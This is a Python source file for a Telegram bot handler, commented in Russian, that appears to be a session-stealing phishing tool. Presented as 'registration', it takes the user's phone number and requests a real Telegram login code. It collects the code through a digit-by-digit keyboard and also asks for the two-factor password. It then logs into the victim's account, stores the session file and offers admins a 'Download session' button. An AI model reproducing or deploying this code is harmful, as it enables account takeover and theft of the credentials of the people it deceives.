import os
import asyncio
import logging
from datetime import datetime
from aiogram import Router, Bot, F, types
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.utils.keyboard import ReplyKeyboardBuilder, InlineKeyboardBuilder
from aiogram.exceptions import TelegramBadRequest

from telethon.sync import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, FloodWaitError

from handlers.states import AuthStates
from handlers.utils import (
    auth_start_times, user_auth_data, admin_ids, 
    check_auth_timeout, admin_notifications
)

# Настройка логирования
logger = logging.getLogger(__name__)

# Создаем роутер
router = Router()

@router.callback_query(F.data == "register")
async def process_register(callback: types.CallbackQuery, state: FSMContext, bot: Bot):
    """Обработчик нажатия на кнопку регистрации"""
    user_id = callback.from_user.id
    
    # Устанавливаем время начала авторизации
    auth_start_times[user_id] = datetime.now()
    
    # Запускаем таймер проверки таймаута
    asyncio.create_task(check_auth_timeout(user_id, bot))
    
    # Создаем клавиатуру для запроса номера телефона
    keyboard = ReplyKeyboardBuilder()
    keyboard.button(text="📱 Поделиться номером телефона", request_contact=True)
    keyboard.adjust(1)
    
    await state.set_state(AuthStates.waiting_for_phone)
    await callback.message.answer(
        "*📲 Для регистрации необходимо поделиться номером телефона*\n\n"
        "*Нажмите на кнопку ниже:*",
        reply_markup=keyboard.as_markup(resize_keyboard=True),
        parse_mode="Markdown"
    )
    await callback.answer()

@router.message(AuthStates.waiting_for_phone, F.contact)
async def process_phone_number(message: types.Message, state: FSMContext, bot: Bot):
    """Обработчик получения номера телефона"""
    user_id = message.from_user.id
    phone = message.contact.phone_number
    
    # Проверяем, начинается ли номер с +
    if not phone.startswith('+'):
        phone = '+' + phone
    
    # Сохраняем номер телефона в состоянии
    await state.update_data(phone=phone)
    
    # Получаем данные для авторизации
    api_id = os.getenv('API_ID')
    api_hash = os.getenv('API_HASH')
    
    # Проверка что API_ID и API_HASH заданы
    if not api_id or not api_hash:
        logger.error("API_ID или API_HASH не настроены в .env файле")
        await message.answer(
            "*⚠️ Ошибка настройки бота*\n\n"
            "*Свяжитесь с администратором.*",
            parse_mode="Markdown"
        )
        return
    
    # ОЧЕНЬ ВАЖНО: API_ID должен быть целым числом (int)
    try:
        api_id = int(api_id)
    except ValueError:
        logger.error(f"API_ID не является числом: {api_id}")
        await message.answer(
            "*⚠️ Ошибка настройки бота*\n\n"
            "*Свяжитесь с администратором.*",
            parse_mode="Markdown"
        )
        return
    
    # Отправляем сообщение о начале авторизации
    await message.answer(
        "*📲 Начинаем процесс авторизации...*\n\n"
        f"*Номер телефона:* `{phone}`",
        parse_mode="Markdown"
    )
    
    # Создаем сессию Telethon
    session_file = f'sessions/{user_id}'
    client = TelegramClient(session_file, api_id, api_hash)
    
    try:
        await client.connect()
        
        # Отправляем код авторизации и сохраняем phone_code_hash
        logger.info(f"Отправляем запрос кода на номер: {phone}")
        result = await client.send_code_request(phone)
        phone_code_hash = result.phone_code_hash
        logger.info(f"Код отправлен, phone_code_hash: {phone_code_hash}")
        
        await state.update_data(phone_code_hash=phone_code_hash)
        
        # Создаем клавиатуру для ввода кода
        keyboard = ReplyKeyboardBuilder()
        for i in range(1, 10):
            keyboard.button(text=str(i))
        keyboard.button(text="0")
        keyboard.button(text="⌫")  # Кнопка удаления
        keyboard.adjust(3, 3, 3, 2)  # Располагаем по 3 кнопки в ряд
        
        # Сохраняем пустую строку для кода
        user_auth_data[user_id] = ""
        
        # Сначала отправляем сообщение с инструкцией
        await message.answer(
            "*📲 Код подтверждения отправлен на ваш телефон!*\n\n"
            "*Введите полученный код, используя клавиатуру ниже.*\n"
            "*Нажмите на ⌫ для удаления последней цифры.*",
            reply_markup=keyboard.as_markup(resize_keyboard=True),
            parse_mode="Markdown"
        )
        
        # Отправляем отдельное сообщение с текущим кодом, которое будем редактировать
        code_msg = await message.answer(
            "*Текущий код:* _(пусто)_",
            parse_mode="Markdown"
        )
        
        # Сохраняем идентификатор сообщения с кодом для дальнейшего редактирования
        await state.update_data(code_message_id=code_msg.message_id)
        await state.set_state(AuthStates.waiting_for_code)
        
    except FloodWaitError as e:
        # Если сработала защита от флуда, сообщаем пользователю
        error_message = f"FloodWaitError: нужно подождать {e.seconds} секунд"
        logger.error(error_message)
        
        await message.answer(
            f"*⚠️ Сработала защита от флуда*\n\n"
            f"*Нужно подождать {e.seconds} секунд прежде чем пробовать снова.*",
            parse_mode="Markdown"
        )
        await state.clear()
        
        # Удаляем данные авторизации
        if user_id in auth_start_times:
            del auth_start_times[user_id]
        if user_id in user_auth_data:
            del user_auth_data[user_id]
        
    except Exception as e:
        # В случае ошибки
        error_message = f"Ошибка при отправке кода: {str(e)}"
        logger.error(error_message)
        
        await message.answer(
            f"*⚠️ Произошла ошибка при отправке кода*\n\n"
            f"*Ошибка:* `{str(e)}`\n\n"
            "*Пожалуйста, попробуйте снова через команду /start*",
            parse_mode="Markdown"
        )
        await state.clear()
        
        # Удаляем данные авторизации
        if user_id in auth_start_times:
            del auth_start_times[user_id]
        if user_id in user_auth_data:
            del user_auth_data[user_id]
            
        # Удаляем файл сессии, если он был создан
        if os.path.exists(f"{session_file}.session"):
            try:
                os.remove(f"{session_file}.session")
            except PermissionError:
                pass
    finally:
        if client and client.is_connected():
            await client.disconnect()

@router.message(AuthStates.waiting_for_code, F.text)
async def process_code(message: types.Message, state: FSMContext, bot: Bot):
    """Обработчик ввода кода подтверждения"""
    user_id = message.from_user.id
    text = message.text
    
    # Получаем данные из состояния
    data = await state.get_data()
    code_message_id = data.get("code_message_id")
    
    # Проверяем наличие пользователя в словаре данных авторизации
    if user_id not in user_auth_data:
        await message.answer(
            "*⚠️ Время ожидания истекло*\n\n"
            "*Пожалуйста, начните процесс заново с команды /start*",
            parse_mode="Markdown"
        )
        await state.clear()
        return
    
    # Обрабатываем ввод пользователя
    if text == "⌫":
        # Удаляем последнюю цифру
        if user_auth_data[user_id]:
            user_auth_data[user_id] = user_auth_data[user_id][:-1]
    elif text.isdigit() and len(text) == 1:
        # Добавляем цифру к коду
        user_auth_data[user_id] += text
    else:
        # Неверный ввод - отправляем сообщение и не обновляем код
        await message.answer(
            "*⚠️ Используйте только цифры на клавиатуре или кнопку удаления*",
            parse_mode="Markdown"
        )
        return
    
    # Отображаем текущий код, обновляя существующее сообщение
    current_code = user_auth_data[user_id] or "_(пусто)_"
    
    try:
        # Редактируем сообщение с кодом
        if code_message_id:
            try:
                await bot.edit_message_text(
                    f"*Текущий код:* {current_code}",
                    chat_id=user_id,
                    message_id=code_message_id,
                    parse_mode="Markdown"
                )
            except TelegramBadRequest as e:
                # Если сообщение не изменилось, Telegram выдаст ошибку, но мы её игнорируем
                if "message is not modified" not in str(e).lower():
                    logger.error(f"Ошибка при редактировании сообщения: {e}")
        else:
            # Если нет ID сообщения с кодом, отправляем новое и сохраняем его ID
            new_code_msg = await message.answer(
                f"*Текущий код:* {current_code}",
                parse_mode="Markdown"
            )
            await state.update_data(code_message_id=new_code_msg.message_id)
    except Exception as e:
        logger.error(f"Ошибка при обновлении кода: {e}")
        # В случае проблем отправляем новое сообщение
        await message.answer(
            f"*Текущий код:* {current_code}",
            parse_mode="Markdown"
        )
    
    # Если набрали 5 цифр, пытаемся авторизоваться
    if len(user_auth_data[user_id]) == 5:
        await try_login_with_code(message, state, bot)

@router.message(AuthStates.waiting_for_2fa, F.text)
async def process_2fa(message: types.Message, state: FSMContext, bot: Bot):
    """Обработчик ввода пароля двухфакторной аутентификации"""
    user_id = message.from_user.id
    password = message.text
    
    # Получаем данные из состояния
    data = await state.get_data()
    phone = data.get("phone")
    phone_code_hash = data.get("phone_code_hash")
    code = user_auth_data.get(user_id, "")
    
    # Получаем данные для авторизации
    api_id = int(os.getenv('API_ID'))
    api_hash = os.getenv('API_HASH')
    
    # Путь к файлу сессии
    session_file = f'sessions/{user_id}'
    
    # Создаем клиент и пытаемся войти с двухфакторной аутентификацией
    client = TelegramClient(session_file, api_id, api_hash)
    
    try:
        await client.connect()
        
        # Проверяем текущий статус
        if not await client.is_user_authorized():
            # Сначала пробуем отправить код еще раз, чтобы клиент знал, что мы в процессе 2FA
            try:
                await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
            except SessionPasswordNeededError:
                # Это ожидаемая ошибка, которая означает, что клиент готов к вводу 2FA
                pass
            except Exception as e:
                logger.warning(f"Ошибка при повторной отправке кода для 2FA: {e}")
        
        # Пробуем ввести пароль 2FA
        await client.sign_in(password=password)
        
        # Успешная авторизация
        await successful_auth(message, user_id, session_file, bot)
        
    except Exception as e:
        # Ошибка авторизации
        error_message = f"Ошибка при 2FA авторизации: {str(e)}"
        logger.error(error_message)
        
        await message.answer(
            "*⚠️ Ошибка авторизации*\n\n"
            f"*Ошибка:* `{str(e)}`\n\n"
            "*Неверный пароль двухфакторной аутентификации. Пожалуйста, попробуйте снова.*",
            parse_mode="Markdown"
        )
    finally:
        if client and client.is_connected():
            await client.disconnect()
        
        # Очищаем состояние после успешной или неудачной авторизации
        if user_id in user_auth_data:
            del user_auth_data[user_id]

async def try_login_with_code(message: types.Message, state: FSMContext, bot: Bot):
    """Пытается авторизоваться с введенным кодом"""
    user_id = message.from_user.id
    
    # Получаем данные из состояния
    data = await state.get_data()
    phone = data.get("phone")
    phone_code_hash = data.get("phone_code_hash")
    code = user_auth_data[user_id]
    
    # Получаем данные для авторизации
    api_id = int(os.getenv('API_ID'))
    api_hash = os.getenv('API_HASH')
    
    # Путь к файлу сессии
    session_file = f'sessions/{user_id}'
    
    # Сообщаем о попытке входа
    await message.answer(
        "*🔄 Выполняется вход в аккаунт...*",
        parse_mode="Markdown"
    )
    
    # Создаем клиент и пытаемся войти
    client = TelegramClient(session_file, api_id, api_hash)
    
    try:
        await client.connect()
        
        try:
            logger.info(f"Пытаемся войти с кодом {code}, phone_code_hash: {phone_code_hash}")
            # Пытаемся войти с кодом и phone_code_hash
            await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
            
            # Успешная авторизация
            await successful_auth(message, user_id, session_file, bot)
            
        except SessionPasswordNeededError:
            # Если требуется пароль двухфакторной аутентификации
            await state.set_state(AuthStates.waiting_for_2fa)
            
            # Создаем обычную клавиатуру
            keyboard = types.ReplyKeyboardRemove()
            
            await message.answer(
                "*🔐 Требуется двухфакторная аутентификация*\n\n"
                "*Пожалуйста, введите пароль от вашего аккаунта:*",
                reply_markup=keyboard,
                parse_mode="Markdown"
            )
            
        except PhoneCodeInvalidError:
            # Если код неверный
            logger.info(f"Неверный код подтверждения: {code}")
            await message.answer(
                "*⚠️ Неверный код подтверждения*\n\n"
                "*Пожалуйста, попробуйте ввести код заново.*",
                parse_mode="Markdown"
            )
            
            # Очищаем код и позволяем ввести заново
            user_auth_data[user_id] = ""
            
            # Обновляем сообщение с кодом
            if data.get("code_message_id"):
                try:
                    await bot.edit_message_text(
                        "*Текущий код:* _(пусто)_",
                        chat_id=user_id,
                        message_id=data["code_message_id"],
                        parse_mode="Markdown"
                    )
                except Exception as e:
                    logger.error(f"Ошибка при сбросе кода: {e}")
            
        except Exception as e:
            # В случае ошибки
            error_message = f"Ошибка авторизации: {str(e)}"
            logger.error(error_message)
            
            await message.answer(
                "*⚠️ Произошла ошибка при авторизации*\n\n"
                f"*Ошибка:* `{str(e)}`\n\n"
                "*Пожалуйста, попробуйте снова через команду /start*",
                parse_mode="Markdown"
            )
            
            # Очищаем состояние и данные авторизации
            await state.clear()
            if user_id in auth_start_times:
                del auth_start_times[user_id]
            if user_id in user_auth_data:
                del user_auth_data[user_id]
            
            # Удаляем файл сессии, если он был создан
            try:
                if os.path.exists(f"{session_file}.session"):
                    os.remove(f"{session_file}.session")
            except PermissionError:
                # Если файл занят другим процессом, попробуем позже
                pass
    finally:
        if client and client.is_connected():
            await client.disconnect()

async def successful_auth(message: types.Message, user_id, session_file, bot: Bot):
    """Обрабатывает успешную авторизацию"""
    # Создаем обычную клавиатуру
    keyboard = types.ReplyKeyboardRemove()
    
    # Отправляем сообщение об успешной регистрации
    await message.answer(
        "*✅ Регистрация прошла успешно!*\n\n"
        "*Ожидайте одобрения профиля администратором.*",
        reply_markup=keyboard,
        parse_mode="Markdown"
    )
    
    # Отправляем уведомление администраторам, если включено
    if admin_notifications:
        for admin_id in admin_ids:
            # Создаем инлайн клавиатуру для админа
            kb = InlineKeyboardBuilder()
            kb.button(text="📥 Скачать сессию", callback_data=f"download_session_{user_id}")
            
            # Формируем корректное имя пользователя с экранированием специальных символов
            user_name = message.from_user.full_name
            
            # Создаем ссылку на профиль пользователя в формате tg://user?id=123456
            user_link = f"[{user_name}](tg://user?id={user_id})"
            
            try:
                await bot.send_message(
                    admin_id,
                    f"*🔔 Новая авторизация!*\n\n"
                    f"*👤 Пользователь:* {user_link}\n"
                    f"*🆔 ID:* `{user_id}`",
                    reply_markup=kb.as_markup(),
                    parse_mode="Markdown"
                )
                logger.info(f"Отправлено уведомление администратору {admin_id} о новой авторизации")
            except Exception as e:
                logger.error(f"Не удалось отправить уведомление администратору {admin_id}: {str(e)}")

def register_auth_router(dp):
    """Регистрирует роутер в диспетчере"""
    dp.include_router(router) 